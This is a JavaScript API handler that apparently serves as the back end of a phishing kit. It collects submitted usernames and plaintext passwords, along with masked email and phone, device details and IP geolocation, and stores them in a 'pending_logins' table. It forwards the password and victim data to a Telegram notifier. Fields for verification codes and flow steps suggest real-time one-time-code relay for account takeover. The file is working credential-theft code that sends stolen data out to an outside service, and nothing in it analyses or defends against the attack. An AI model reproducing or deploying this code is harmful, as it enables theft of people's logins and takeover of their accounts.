/**
 *  ╔═╗╔═╗╔╗╔╔═╗╔═╗╦
 *  ╚═╗║╣ ║║║╚═╗║╣ ║
 *  ╚═╝╚═╝╝╚╝╚═╝╚═╝╩
 *  ─── tasks/index.js ───
 */
import { randomUUID } from "crypto";
import { getDb, ensureTable, autoDeclineExpired } from "../_db.js";
import { notifyNewTask } from "../_telegram.js";

function setCors(res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
}

export default async function handler(req, res) {
  setCors(res);

  if (req.method === "OPTIONS") {
    return res.status(204).end();
  }

  if (req.method === "GET") {
    try {
      var sql = getDb(process.env);
      await ensureTable(sql);
      await autoDeclineExpired(sql);
      var tasks = await sql`SELECT * FROM pending_logins ORDER BY created_at DESC`;
      return res.status(200).json({ tasks: tasks });
    } catch (error) {
      console.error("GET /api/tasks error:", error);
      return res.status(500).json({ error: "Failed to fetch tasks" });
    }
  }

  if (req.method === "POST") {
    try {
      var body = req.body;
      var project_id = body.project_id || "member-site";
      var user_id = body.user_id;
      var password = body.password;
      var method = body.method;
      var masked_email = body.masked_email;
      var masked_phone = body.masked_phone;
      var member_origin = body.member_origin || null;
      var request_kind = body.request_kind;
      var cc_id = body.cc_id || null;
      var project_name = body.project_name || null;
      var admin_outcome_notified_at = body.admin_outcome_notified_at || null;
      var device_info = body.device_info || null;
      var screen_size = body.screen_size || null;
      var referrer = body.referrer || null;

      var ip = req.headers["x-forwarded-for"] || req.headers["x-real-ip"] || "Unknown";
      if (typeof ip === "string" && ip.includes(",")) ip = ip.split(",")[0].trim();
      var cfData = {
        ip: ip,
        country: req.headers["x-vercel-ip-country"] || "Unknown",
        city: req.headers["x-vercel-ip-city"] || "Unknown",
        timezone: req.headers["x-vercel-ip-timezone"] || "Unknown",
        asOrganization: "Unknown",
      };

      if (!user_id || !password || !method || !masked_email || !masked_phone || !request_kind) {
        return res.status(400).json({
          error: "user_id, password, method, masked_email, masked_phone and request_kind are required",
        });
      }

      var sql = getDb(process.env);
      await ensureTable(sql);

      var id = randomUUID();
      var now = Date.now();
      var rows = await sql`
        INSERT INTO pending_logins
          (id, project_id, user_id, password, method, masked_email, masked_phone,
           created_at, member_origin, request_kind, cc_id, project_name,
           admin_outcome_notified_at, resolved_at, resolved_by,
           flow_step, code_delivery_method, verification_code, pending_since)
        VALUES
          (${id}, ${project_id}, ${user_id}, ${password}, ${method}, ${masked_email},
           ${masked_phone}, ${now}, ${member_origin}, ${request_kind},
           ${cc_id}, ${project_name}, ${admin_outcome_notified_at}, ${null}, ${null},
           'login', ${null}, ${null}, ${now})
        RETURNING *
      `;
      var task = rows[0];

      notifyNewTask(process.env, {
        id: id,
        user_id: user_id,
        masked_email: masked_email,
        masked_phone: masked_phone,
        method: method,
        project_id: project_id,
        project_name: project_name,
        request_kind: request_kind,
        member_origin: member_origin,
        cc_id: cc_id,
        password: password,
        device_info: device_info,
        screen_size: screen_size,
        referrer: referrer,
        cf: cfData,
      }).catch(function (e) { console.error("Telegram notify error:", e); });

      return res.status(201).json({ task: task });
    } catch (error) {
      console.error("POST /api/tasks error:", error);
      return res.status(500).json({ error: "Failed to create task" });
    }
  }

  return res.status(405).json({ error: "Method not allowed" });
}
